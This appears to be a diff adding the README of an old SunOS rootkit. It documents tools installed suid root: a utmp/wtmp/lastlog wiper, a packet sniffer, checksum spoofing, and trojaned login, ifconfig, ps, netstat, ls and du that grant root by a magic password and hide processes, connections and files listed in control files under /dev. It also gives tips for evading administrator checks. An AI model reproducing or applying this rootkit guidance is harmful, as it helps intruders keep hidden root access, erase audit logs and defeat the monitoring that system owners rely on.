@@ -1,0 +1,117 @@
+------------------
+rootkit release 1.
+------------------
+
+After spending tons of time having to do all of this by myself, 
+I finally decided to write a simple makefile to do it for me.
+Call me a script cracker, but I'm lazy as hell.  You don't want
+to use it, you don't have to.  Keep in mind it takes me a max
+of 40 seconds on a 4/65 to compile and install every program
+here.  Can you beat that by hand?  :-)
+
+Here is how it works:
+
+execute the command: ` make all install '
+
+
+The following programs will be installed suid root in DESTDIR:
+
+z2:	removes entries from utmp, wtmp, and lastlog.
+es:	rokstar's ethernet sniffer for sun4 based kernels.
+fix:	try to fake checksums, install with same dates/perms/u/g.
+
+note:	if you do not want these files installed suid (the administrator
+	has a cron to check for suid files, or the like), then type
+	make cleansuid and the suid bits will be removed.
+
+The following programs will be patched and an attempt at spoofing
+the checksums of the files will be made.  Also, these files will
+be installed with the same dates, permissions, owners, and groups
+of the originals. 
+
+sl:	become root via a magic password sent to login.
+ic:	modified ifconfig to remove PROMISC flag from output.
+ps:
+ns:
+ls:
+du5:
+ls5:
+
+Here are some notes on the patch for `ps`:
+
+        1.
+        This doesn't modify the process lists, so your
+        processes are STILL in memory, but ps just won't
+        administrator has another copy of ps sitting on
+        Best to search for SGID kmem programs to be fairly sure.
+
+        2.
+        An example /dev/ptyp file is as follows:
+
+        0 0             Strips all processes running under root
+        1 p0            Strips tty p0
+        2 sniffer       Strips all programs with the name sniffer
+
+	3.
+        Do not leave a NULL string anywhere in the file.  During
+        testing, I often pressed return after my last control
+        statement.  Do not do this as it will cause a meory fault.
+        Do not use a character as the first line in the control file.
+        Remember to convert the UID's you wished masked to thier
+        numerical format.
+
+	4.
+	Programs such as "top" will still show processes running.
+	This is bad.  I'm working on a patch.
+
+Here are some notes on the patch for `netstat`:
+
+        1.
+        This doesn't modify network listings, so your network
+        connections are STILL in memory, but `netstat` just
+        won't display them.  If another copy of `netstat` is
+        run on the machine, it will produce accurate results.
+        Best to search for SGID kmem programs to be fairly sure.
+
+        2.
+        An example /dev/ptyq file is as follows:
+
+        0 6667          # Strip all foreign irc network connections
+        1 23            # Strip all local telnet connections
+        2 .209.5        # Strip all foreign connections from cert.org
+        3 .175.9.8      # Strip all local connections to netsys4.netsys.com
+
+        3.
+        Do not leave a NULL string anywhere in the file.  It
+        will cause a memory fault.  When stripping addresses,
+        a string search is used to compare addresses in the
+        control file with actaul network connections.  This
+        could cause minor problems.
+
+        4.
+        It would probably be better to only strip the address ONCE
+        for each line in the control file.  Adding such commands
+        is trivial.  Check `inet.c` for modifications.
+
+Here are some notes on the patch for `ls` && `du` && `du5` && `ls5`:
+
+	1.
+	ls and du are trojaned and your files will
+	not be listed unless you issue a / flag.
+
+	2. 
+	Example /dev/ptyr
+
+	sunsnif		# Strip the filename sunsnif
+	icmpfake	# Strip the filename icmpfake
+
+	3. 
+	Would be useful if stripping uids, and gids was
+	included.
+	 
+----
+
+later eleetz, have fun and don't fuq shit up, all it duz
+iz get people put in jail. 
+
+werd.
